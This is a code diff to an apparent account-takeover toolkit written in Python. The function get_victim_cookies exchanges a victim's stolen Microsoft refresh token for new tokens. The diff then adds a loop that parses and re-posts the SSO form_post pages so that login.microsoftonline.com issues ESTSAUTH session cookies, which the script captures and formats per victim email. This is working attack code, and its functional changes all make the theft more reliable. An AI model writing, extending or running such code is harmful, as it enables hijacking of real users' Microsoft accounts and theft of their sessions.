@@ -3,6 +3,7 @@ import json
 import time
 import base64
 import uuid
+import re
 import sqlite3
 import threading
 import signal
@@ -154,13 +155,14 @@ def decode_id_token(id_token):
 
 # ---------- Cookie minting ----------
 def get_victim_cookies(refresh_token, client_id, email):
-    """Exchange refresh token, then hit /authorize so MS sets ESTSAUTH cookies."""
+    """Refresh tokens, then complete the SSO authorize round-trip INCLUDING the
+    auto form_post, so login.microsoftonline.com issues ESTSAUTH cookies."""
     try:
         s = requests.Session()
         s.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
         })
-        # Step 1: refresh token -> new tokens (same client_id, same Outlook scope)
+        # Step 1: refresh token -> new tokens (same client_id, same scope)
         r = s.post(
             f"{UPSTREAM}/common/oauth2/v2.0/token",
             data={
@@ -176,7 +178,7 @@ def get_victim_cookies(refresh_token, client_id, email):
             print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
             return None
 
-        # Step 2: SSO authorize round-trip so login.microsoftonline.com issues cookies
+        # Step 2: SSO authorize round-trip (SSO from the refreshed session)
         nonce = uuid.uuid4().hex
         auth_url = (
             f"{UPSTREAM}/common/oauth2/authorize?"
@@ -185,7 +187,19 @@ def get_victim_cookies(refresh_token, client_id, email):
             f"&scope=openid&response_mode=form_post&nonce={nonce}"
             f"&login_hint={email}"
         )
-        s.get(auth_url, timeout=25, allow_redirects=True)
+        resp = s.get(auth_url, timeout=25, allow_redirects=True)
+
+        # Step 3: MS returns an HTML page with a form that a browser auto-submits.
+        # requests won't do that, so we parse the form and POST it ourselves.
+        for _ in range(5):  # follow up to 5 chained form_posts
+            m = re.search(r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>',
+                          resp.text, re.IGNORECASE | re.DOTALL)
+            if not m:
+                break
+            action = m.group(1).replace("&amp;", "&")
+            fields = dict(re.findall(
+                r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', m.group(2)))
+            resp = s.post(action, data=fields, timeout=25, allow_redirects=True)
 
         cookies = {}
         for c in s.cookies:
@@ -194,11 +208,12 @@ def get_victim_cookies(refresh_token, client_id, email):
         if not cookies:
             print("[COOKIES] no wanted cookies captured")
             return None
-        print(f"[COOKIES] captured {len(cookies)} cookies")
+        print(f"[COOKIES] captured {len(cookies)} cookies: {list(cookies.keys())}")
         return cookies
     except Exception as e:
         print(f"[COOKIES] exception: {e}")
         return None
+
 
 def format_cookies_text(cookies, email):
     lines = [f" COOKIE SESSION - {email}", "Domain: login.microsoftonline.com", ""]
